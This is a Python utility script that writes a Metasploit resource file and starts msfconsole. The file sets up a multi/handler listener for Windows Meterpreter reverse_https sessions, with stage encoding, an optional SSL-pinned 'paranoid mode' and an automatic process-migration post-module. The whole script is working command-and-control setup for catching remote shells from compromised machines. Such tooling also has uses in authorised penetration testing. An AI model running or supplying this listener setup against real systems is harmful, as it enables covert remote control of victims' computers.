#!/usr/bin/env python

from __future__ import print_function
import os,sys,subprocess,argparse

__author__ = "secjey"
__copyright__ = "Copyright 2017"
__credits__ = [""]
__license__ = "GPLv3"
__version__ = "1.0.1"
__maintainer__ = "secjey"
__status__ = "Development"

DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 9999

RESOURCE_FILE = "multi_handler.rc"
RESOURCE = """
use multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST {}
set LPORT {}
{}
set ExitOnSession false
set EnableStageEncoding {}
set AutoRunScript post/windows/manage/smart_migrate
run -j
"""

# The PEM file required below can be generated as follows:
# openssl req -x509 -sha256 -newkey rsa:4096 -keyout metasploit.key -out metasploit.crt -days 365 -nodes
# cat metasploit.key metasploit.crt > metasploit.pem
PEM_FILE = "metasploit.pem"
PARANOID_MODE = """
set HandlerSSLCert {}
set IgnoreUnknownPayloads true
set StagerVerifySSLCert true
""".format(PEM_FILE)

def get_parser():
	"""Parses the arguments passed in the command line."""
	parser = argparse.ArgumentParser(description='DESCRIPTION')
	parser.add_argument('host', nargs="?", help="IP address for the LHOST parameter.", default=DEFAULT_HOST)
	parser.add_argument('port', nargs="?", help="Port for the LPORT parameter.", default=DEFAULT_PORT)
	parser.add_argument('-nm', '--normal-mode', dest="paranoid_mode", action="store_false", help="Deactivate Meterpreter Paranoid Mode.", default=True)
	parser.add_argument('-ne', '--no-encoding', dest="encode_stage", action="store_false", help="Deactivate stage encoding.", default=True)
	return parser

def format_resource(host, port, paranoid_mode, encode_stage):
	return RESOURCE.format(host, port, PARANOID_MODE if paranoid_mode else "", str(encode_stage).lower())

def build(resource):
	"""Write a resource file and call it."""
	with open(RESOURCE_FILE, "w") as f:
		f.write(resource)
	subprocess.Popen("msfconsole -qr {}".format(RESOURCE_FILE), shell=True).communicate()

def main():
	parser = get_parser()
	args = parser.parse_args()
	if not os.path.exists(PEM_FILE):
		print('\033[91m' + "[!] {} does not seem to exist. Please ensure it is located in the same directory as this script.".format(PEM_FILE) + '\033[0m')
		return
	rsrc = format_resource(args.host, args.port, args.paranoid_mode, args.encode_stage)
	build(rsrc)

if __name__ == '__main__':
	main()

